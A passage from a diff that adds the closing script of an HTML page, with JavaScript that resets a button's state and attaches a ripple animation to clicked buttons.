+            btn.style.opacity = '1';
+            isRunning = false;
+        }
+
+        document.querySelectorAll('.btn').forEach(btn => {
+            btn.addEventListener('click', function(e) {
+                const ripple = document.createElement('span');
+                ripple.className = 'ripple';
+                const rect = this.getBoundingClientRect();
+                ripple.style.left = (e.clientX - rect.left) + 'px';
+                ripple.style.top = (e.clientY - rect.top) + 'px';
+                this.appendChild(ripple);
+                setTimeout(() => ripple.remove(), 600);
+            });
+        });
+    </script>
+</body>
+</html>
